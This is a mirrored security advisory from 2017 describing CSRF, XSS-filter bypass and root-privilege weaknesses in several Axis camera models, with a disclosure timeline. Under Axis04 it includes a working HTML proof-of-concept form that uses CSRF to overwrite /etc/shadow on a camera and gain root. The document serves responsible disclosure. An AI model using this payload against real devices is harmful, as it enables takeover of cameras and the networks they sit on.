@@ -1,0 +1,216 @@
+id: 27336
+date: 03/17/2017
+title: AXIS Cross Site Request Forgery / Cross Site Scripting Vulnerabilities
+author: David Wearing
+cves: 
+
+Introduction
+
+============
+
+Vulnerabilities were identified in the camera software by Axis.  These were
+discovered during a black box assessment and therefore the vulnerability
+list should not be considered exhaustive; observations suggest that it is
+likely that further vulnerabilities exist.
+
+Affected Software And Versions
+
+==============================
+
+
+Model P1204, software versions <= 5.50.4
+
+Model P3225, software versions <= 6.30.1
+
+Model P3367, software versions <= 6.10.1.2
+
+Model M3045, software versions <= 6.15.4.1
+
+Model M3005, software versions <= 5.50.5.7
+
+Model M3007, software versions <= 6.30.1.1
+
+CVE
+
+===
+
+No CVEs have been assigned to these vulnerabilities.
+
+
+Vulnerability Overview
+
+======================
+
+1. Axis01: No cross-site request forgery protections
+
+2. Axis02: Bypass manual checks for XSS
+
+3. Axis03: Web services run as root
+
+4. Axis04: Script editor function allows for arbitrary write as root on
+successful CSRF attack
+
+5. Axis05: root setuid .CGI scripts and binaries present
+
+6. Axis06: Inability to disable the http interface
+
+Vulnerability Details
+
+=====================
+
+---------------------------------------------
+
+1. Axis01: No cross-site request forgery protections
+
+---------------------------------------------
+
+Axis software does not have any cross-site request forgery protection
+within the management interface. Axis provide guidance on risk mitigation
+for CSRF only.
+
+https://www.axis.com/files/faq/Advisory_Cross-Site_Request_Forgery.pdf
+
+--------------------------------------------------
+
+2. Axis02: Bypass manual checks for XSS
+
+--------------------------------------------------
+
+Axis software on the camera has client-side JavaScript to try and remove
+XSS payloads. No server-side security checks are present. Viewers or lower
+privileged users of cameras exposed to the internet or corporate networks
+may be able to store persistent XSS payloads.
+
+Example of code in language_incl.js used to detect and remove malicious
+javaScript shown below:
+
+if( data.toLowerCase().indexOf(\"<script\") != -1 ||
+data.toLowerCase().indexOf(\"</script\") != -1 )
+
+
+-----------------------------------------------
+
+3. Axis03: Web service runs as root
+
+-----------------------------------------------
+
+The versions of Axis software tested have a BOA server (boa) running as
+root. BOA is an ancient web server and no longer maintained since approx.
+2005. Fuzzing of the process using off-the-shelf fuzzers result in crashes
+that have not yet been investigated further.
+
+Axis software versions >5.70 have replaced BOA with Apache.
+
+
+-----------------------------------------------
+
+4. Axis04: Script editor function allows for arbitrary write as root on
+successful CSRF attack
+
+-----------------------------------------------
+
+A script editor function a/admin-bin/editcgi.cgia can be used to write as
+root to the device, due to Axis01 lack of CSRF protection, this can be
+exploited to write over /etc/shadow and obtain root access to the device,
+as well as backdoor the device.
+
+Proof of concept to overwrite /etc/shadow file:
+
+<body>
+<form action="https://<ip-of-axis-camera|hostname>/admin-bin/editcgi.cgi?file=/etc/shadow"
+method="POST" >
+<input type="hidden" name="save_file" value="/etc/shadow" />
+<input type="hidden" name="mode" value="0100600" />
+<input type="hidden" name="convert_crlf_to_lf" value="on" />
+<input type="hidden" name="content" value="#####INPUT HTML ENCODED SHADOW
+HERE##### " />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+
+-----------------------------------------------
+
+5. Axis05: root setuid .CGI scripts and binaries present
+
+-----------------------------------------------
+
+Multiple root setuid .CGI scripts and binaries are present. The CGI scripts
+manage web session temp files,group memberships and functionality of the
+camera. Exploitable vulnerabilities in any will provide root access to the
+camera.
+
+E.g /axis-cgi/admin/param.cgi & /axis-cgi/admin/pwdgrp.cgi which allows for
+changing user and group passwords.
+
+-----------------------------------------------
+
+6. Axis06: Inability to disable the HTTP interface
+
+-----------------------------------------------
+
+No option existed in Axis software to disable the HTTP interface. The web
+server will always listen on all network interfaces of the camera, which
+makes these cameras trivial to find on the internet e.g. using Shodan.
+
+E.g port 80 is listening and /httpDisabled.shtml is always accessible.
+
+Axis advise to move the web server listening port to another port.
+
+Mitigation
+
+==========
+
+Axis released zero advisories related to the issues reported here.
+
+Axis recommends following their hardening guide available on:
+https://www.axis.com/mu/en/support/product-security
+
+For the vulnerabilities related to Axis02, Axis03 and Axis06 Axis has
+recommended to upgrade Axis software to versions >5.70 or use the new Axis
+platform with >7.10 versions. Versions other than those listed here have
+not been tested to confirm these vulnerabilities have been fixed.
+
+Author
+
+======
+
+The vulnerabilities were discovered by David Wearing from Google Security
+Team.
+
+Timeline
+
+========
+
+2016/11/24 - Security report sent to Axis with 90 day disclosure deadline
+(2017/02/24).
+
+2016/12/02 - Axis acknowledges report and starts working on the issues.
+
+2016/12/06 - Pinged for patch ETA.
+
+2016/12/09 - Pinged for patch ETA.
+
+2017/01/11 - Pinged for patch ETA.
+
+2017/01/12 - Response from Axis Security listing multiple issues as having
+been fixed in the new firmware versions. Redesign of CGI scripts to be
+interfaces confirmed.
+
+2017/01/25 - Send query regarding the lack of CSRF protections and if
+changes to handling of XSS was to occur.
+
+2017/02/28 - Request to Axis on any advice or mitigations they want to
+include in the post.
+
+2017/03/02 - Pinged Axis.
+
+2017/03/02 - Response from Axis including advice on mitigation of CSRF.
+
+2017/03/05 - Review of mitigations provided to Axis
+
+2017/03/10 - Discussions with Axis on post.
+
+2017/03/15 - Public disclosure.
+
+
+#  0day.today [2023-03-27]  #
